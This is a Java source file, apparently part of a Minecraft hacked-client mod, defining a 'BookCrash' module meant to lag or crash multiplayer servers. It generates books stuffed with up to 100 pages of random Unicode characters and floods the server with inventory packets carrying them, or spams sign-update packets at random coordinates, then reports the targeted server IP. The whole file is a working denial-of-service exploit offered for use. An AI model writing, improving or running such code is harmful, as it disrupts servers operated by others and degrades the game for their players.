package net.zebra.quiverone.modules.crash;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.minecraft.class_124;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2338;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_2519;
import net.minecraft.class_2813;
import net.minecraft.class_2873;
import net.minecraft.class_2877;
import net.zebra.quiverone.Main;
import net.zebra.quiverone.modules.Category;
import net.zebra.quiverone.modules.Module;
import net.zebra.quiverone.modules.setting.Setting;
import net.zebra.quiverone.modules.setting.settings.BooleanSetting;
import net.zebra.quiverone.modules.setting.settings.ModeSetting;
import net.zebra.quiverone.modules.setting.settings.NumberSetting;

public class BookCrash extends Module {
   private BooleanSetting autoDisable = new BooleanSetting("AutoDisable", this, true);
   private BooleanSetting sendMessage = new BooleanSetting("Send Message", this, true);
   public NumberSetting speed = new NumberSetting("Speed", this, 100.0D, 1.0D, 300.0D, 1.0D);
   public ModeSetting method = new ModeSetting("Method", this, "Sign", new String[]{"Sign", "ClickSlot", "Creative"});
   public NumberSetting page = new NumberSetting("Pages", this, 100.0D, 1.0D, 100.0D, 1.0D);

   public BookCrash() {
      super("Book", "Attempts to lag the server", Category.CRASH, -1, false, true);
      this.addSetting(new Setting[]{this.method, this.page, this.speed, this.autoDisable, this.sendMessage});
   }

   public void onUpdate() {
      class_1799 bookObj = new class_1799(class_1802.field_8674);
      class_2499 list = new class_2499();
      class_2487 tag = new class_2487();
      String author = Main.mod_name;
      String title = "\n sus在顶部ez \n";
      String size = "";
      int pages = Math.min((int)this.page.getValue(), 100);
      int pageChars = 210;
      IntStream chars = (new Random()).ints(128, 1112063).map((ix) -> {
         return ix < 55296 ? ix : ix + 2048;
      });
      size = (String)chars.limit((long)(pageChars * pages)).mapToObj((ix) -> {
         return String.valueOf((char)ix);
      }).collect(Collectors.joining());
      if (this.method.is("Sign")) {
         String text = "sus在顶部ez";
         Random rand = new Random();

         for(int i = 0; i < 100; ++i) {
            mc.field_1724.field_3944.method_2883(new class_2877(new class_2338(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
         }
      } else {
         int i;
         for(i = 0; i < pages; ++i) {
            class_2519 tString = class_2519.method_23256(size);
            list.add(tString);
         }

         tag.method_10582("author", author);
         tag.method_10582("title", title);
         tag.method_10566("pages", list);
         bookObj.method_7959("pages", list);
         bookObj.method_7980(tag);

         for(i = 0; (double)i < this.speed.getValue(); ++i) {
            if (this.method.is("ClickSlot")) {
               mc.field_1724.field_3944.method_2883(new class_2813(0, 0, 0, class_1713.field_7790, bookObj, (short)0));
            } else {
               mc.field_1724.field_3944.method_2883(new class_2873(0, bookObj));
            }
         }
      }

      if (this.sendMessage.isEnabled()) {
         sendMessage("Attempted to lag " + class_124.field_1079 + this.getIP() + class_124.field_1061 + " using" + class_124.field_1077 + " Book");
      }

      if (this.autoDisable.isEnabled()) {
         this.disable();
      }

   }
}
